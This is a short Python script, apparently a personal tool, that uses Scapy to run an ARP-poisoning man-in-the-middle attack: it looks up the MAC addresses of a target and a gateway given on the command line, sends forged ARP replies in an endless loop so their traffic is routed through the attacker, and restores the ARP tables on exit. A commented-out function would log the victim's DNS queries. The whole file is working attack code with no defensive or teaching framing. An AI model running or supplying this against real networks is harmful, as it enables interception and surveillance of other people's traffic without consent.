from scapy.all import *
# from scapy.all import Ether, srp, ARP, conf, sendp, send, IP, DNS
import sys
import time


interface = "wlo1"
conf.verb = 0
# set with conf.iface = "wlo1"

def get_mac(ip):
        ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, inter = 0.1)
        for snd,rcv in ans:
                return rcv.sprintf(r"%Ether.src%")

class Mitm():
    def __init__(self, target_ip, gateway_ip):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.broadcast = "ff:ff:ff:ff:ff:ff"
        self.target_mac = get_mac(target_ip)
        self.gateway_mac = get_mac(gateway_ip)
        self.attack = True

    def restore_arp(self):
        # used layer 3 send() here
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.gateway_ip, hwsrc=self.target_mac, psrc=self.target_ip), count=5)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.target_ip, hwsrc=self.gateway_mac, psrc=self.gateway_ip), count=5)
        print("[*] ARP Restore packets sent.")

    def arp_poison(self, mode=2):
        # used Layer 2 sendp() here
        # print("[+] Starting ARP Poison ... ")
        # while self.attack:
        sendp(Ether(dst=self.target_mac)/ARP(op=mode, psrc = self.gateway_ip, pdst = self.target_ip))
        sendp(Ether(dst=self.gateway_mac)/ARP(op=mode, psrc = self.target_ip, pdst = self.gateway_ip))
        
    def stop(self):
        self.attack = False
        self.restore_arp()
    

def DNSsniff(packet):
    if IP in packet:
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst # most likely router gateway
        if packet.haslayer(DNS):
            dns_layer = packet.getlayer(DNS)
            # parse only DNS queries
            
            if dns_layer.qr == 0:
                print("[*] SRC:",ip_src,"-->",dns_layer.qd.qname)

def main():
    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    mitm = Mitm(target_ip, gateway_ip)
    try:
        while True:
            mitm.arp_poison()
            print("ARP Poison packet sent --")
            time.sleep(2)
    except KeyboardInterrupt:
        mitm.stop()
        print("Stopping the Poisoning")


if __name__ == '__main__':
    main()

    # print("[+] Starting DNSSniffer x1 ...")
    # sniff(iface=interface, filter="port 53", prn=DNSsniff, store=0)
